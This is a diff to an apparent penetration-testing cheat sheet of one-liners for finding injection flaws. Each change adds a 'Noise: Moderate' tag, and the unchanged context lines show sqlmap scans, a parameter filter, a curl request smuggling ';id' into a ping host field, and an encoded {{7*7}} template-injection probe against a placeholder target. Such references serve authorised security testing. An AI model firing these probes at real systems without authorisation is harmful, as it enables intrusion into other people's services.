@@ -10,7 +10,7 @@ Fast one-liners for SQL, command and template-injection candidates.
 sqlmap -u 'https://<TARGET>/item?id=1' --batch --level=1 --risk=1
 ```
 
-**Tool:** sqlmap · **Platform:** Linux/macOS · **Context:** No auth
+**Tool:** sqlmap · **Platform:** Linux/macOS · **Context:** No auth · **Noise:** Moderate
 
 
 ## SQLMap request file
@@ -19,7 +19,7 @@ sqlmap -u 'https://<TARGET>/item?id=1' --batch --level=1 --risk=1
 sqlmap -r request.txt --batch --level=1 --risk=1
 ```
 
-**Tool:** sqlmap · **Platform:** Linux/macOS · **Context:** No auth
+**Tool:** sqlmap · **Platform:** Linux/macOS · **Context:** No auth · **Noise:** Moderate
 
 
 ## Collect SQLi-shaped parameters
@@ -28,7 +28,7 @@ sqlmap -r request.txt --batch --level=1 --risk=1
 cat urls.txt | grep -Ei '[?&](id|uid|item|page|cat|product|order|query)=' | uro
 ```
 
-**Tool:** grep + uro · **Platform:** Linux/macOS · **Context:** No auth
+**Tool:** grep + uro · **Platform:** Linux/macOS · **Context:** No auth · **Noise:** Moderate
 
 
 ## Command-injection marker check
@@ -37,7 +37,7 @@ cat urls.txt | grep -Ei '[?&](id|uid|item|page|cat|product|order|query)=' | uro
 curl -sk 'https://<TARGET>/ping?host=127.0.0.1%3Bid'
 ```
 
-**Tool:** curl · **Platform:** Cross-platform · **Context:** No auth
+**Tool:** curl · **Platform:** Cross-platform · **Context:** No auth · **Noise:** Moderate
 
 
 ## SSTI arithmetic probe
@@ -46,7 +46,7 @@ curl -sk 'https://<TARGET>/ping?host=127.0.0.1%3Bid'
 curl -sk 'https://<TARGET>/?name=%7B%7B7*7%7D%7D' | grep -n '49'
 ```
 
-**Tool:** curl · **Platform:** Cross-platform · **Context:** No auth
+**Tool:** curl · **Platform:** Cross-platform · **Context:** No auth · **Noise:** Moderate
 
 ---
 
